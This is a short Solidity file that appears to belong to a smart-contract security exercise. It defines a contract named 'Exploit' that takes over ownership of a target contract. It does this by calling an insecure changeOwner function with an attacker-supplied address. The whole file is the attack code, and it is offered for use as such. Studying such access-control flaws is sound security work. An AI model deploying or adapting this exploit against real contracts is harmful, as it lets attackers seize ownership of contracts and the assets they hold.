// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./C.sol";

contract Exploit {
    C public target;

    constructor(address _targetAddress) {
        target = C(_targetAddress);
    }

    // Exploit function to override the owner
    function exploitOwnership(address _maliciousOwner) public {
        // Call the insecure implementation of `changeOwner` from contract B
        target.changeOwner(_maliciousOwner);
    }
}
